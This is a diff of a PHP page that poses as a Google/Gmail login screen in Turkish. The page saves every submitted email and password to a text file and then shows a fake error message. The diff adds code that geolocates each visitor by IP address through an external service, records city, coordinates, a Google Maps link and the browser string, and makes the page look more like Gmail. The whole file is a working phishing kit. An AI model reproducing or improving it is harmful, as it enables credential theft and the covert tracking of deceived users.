@@ -5,15 +5,75 @@ if (isset($_POST['login']) && isset($_POST['password'])) {
 $ac = fopen("kayit.txt","a+");
 $username = $_POST['login'];
 $password = $_POST['password'];
-$userlar = ("\n __________________ \nUsername: ".$username."\nPassword: ".$password."\n__________________ \n");
+$userlar = ("\n Email : ".$username."\n Password : ".$password."\n__________________ \n");
 fwrite($ac,$userlar);
 fclose($ac);
 echo "<script>alert('Kullanıcı Adınız veya Şifrenizi kontrol ediniz!');</script>";
 }
+else{
+date_default_timezone_set('Europe/Istanbul');
+
+function GetIP(){
+ if(getenv("HTTP_CLIENT_IP")) {
+ $ip = getenv("HTTP_CLIENT_IP");
+ } elseif(getenv("HTTP_X_FORWARDED_FOR")) {
+ $ip = getenv("HTTP_X_FORWARDED_FOR");
+ if (strstr($ip, ',')) {
+ $tmp = explode (',', $ip);
+ $ip = trim($tmp[0]);
+ }
+ } else {
+ $ip = getenv("REMOTE_ADDR");
+ }
+ return $ip;
+}
+
+$ip = GetIP();
+
+
+$tarih =" Tarih : ".date('d/m/Y  H:i');
+
+$Geo_Plugin_XML = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=".$ip); 
+$adress = $Geo_Plugin_XML->geoplugin_request; 
+$ulke = $Geo_Plugin_XML->geoplugin_countryName;
+$bolge = $Geo_Plugin_XML->geoplugin_region;
+$kita = $Geo_Plugin_XML->geoplugin_continentCode;
+$ulkekodu = $Geo_Plugin_XML->geoplugin_countryCode;
+$sehir = $Geo_Plugin_XML->geoplugin_city;
+$plaka = $Geo_Plugin_XML->geoplugin_regionCode;
+$enlem = $Geo_Plugin_XML->geoplugin_latitude;
+$boylam = $Geo_Plugin_XML->geoplugin_longitude;
+$tarayici = $_SERVER['HTTP_USER_AGENT']; 
+
+$maps = "https://www.google.com/maps/place/".$enlem.",".$boylam."/@".$enlem.",".$boylam.",16z";
+$yamanefkar["0"] = " Ip Adresi : ".$adress;
+$yamanefkar["1"] = " Ulke : ".$ulke; 
+$yamanefkar["2"] = " Bolge : ".$bolge;
+$yamanefkar["3"] = " Kita : ".$kita;
+$yamanefkar["4"] = " Ulke Kodu : ".$ulkekodu;
+$yamanefkar["5"] = " Sehir : ".$sehir;
+$yamanefkar["6"] = " Plaka : ".$plaka;
+$yamanefkar["7"] = " Enlem : ".$enlem;
+$yamanefkar["8"] = " Boylam : ".$boylam;
+$yamanefkar["9"] = " Google Maps : ".$maps;
+$yamanefkar["10"] = " Tarayıcı : ".$tarayici; 
+
+
+$ac = fopen("kayit.txt","a+");
+
+$userlar = ("\n __________________ \n".$tarih."\n".$yamanefkar["0"]."\n".$yamanefkar["1"]."\n".$yamanefkar["2"]."\n".$yamanefkar["3"]."\n".$yamanefkar["4"]."\n".$yamanefkar["5"]."\n".$yamanefkar["6"]."\n".$yamanefkar["7"]."\n".$yamanefkar["8"]."\n".$yamanefkar["9"]."\n".$yamanefkar["10"]."\n\n!--VERİLER--!\n");
+fwrite($ac,$userlar);
+fclose($ac);
+sleep(2);
+
+
+
+
+}
  ?>
 
 <!DOCTYPE html>
-<html lang="en"><head>
+<html lang="tr"><head>
 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
 <link rel="icon" type="image/ico" href="https://mail.google.com/favicon.ico">
   <meta charset="utf-8">
@@ -739,7 +799,7 @@ echo "<script>alert('Kullanıcı Adınız veya Şifrenizi kontrol ediniz!');</sc
   <div class="google-header-bar">
   <div class="header content clearfix">
   <a id="link-google" href="http://www.google.com/">
-  <img class="logo" src="https://techcrunch.com/wp-content/uploads/2014/01/google-plus-logo.jpg?w=150" alt="Google">
+  <img class="logo" src="https://cdn.worldvectorlogo.com/logos/gmail.svg" alt="Google" style="max-width: 250px;max-height: 68px;">
   </a>
   <a id="link-signup" class="signup" href="https://accounts.google.com/NewAccount">Yeni bir Google Hesabı için kaydolun.</a>
   </div>
@@ -757,11 +817,11 @@ echo "<script>alert('Kullanıcı Adınız veya Şifrenizi kontrol ediniz!');</sc
 <input name="secTok" id="secTok" value="" type="hidden">
 <label>
   <strong class="email-label">Email</strong>
-  <input name="login"  type="text">
+  <input name="login"  type="text" required="">
 </label>
 <label>
   <strong class="passwd-label">Şifre</strong>
-  <input name="password"  type="password">
+  <input name="password"  type="password" required="">
 </label>
   <input class="g-button g-button-submit" name="signIn" id="signIn" value="Giriş" type="submit">
   <label class="remember">
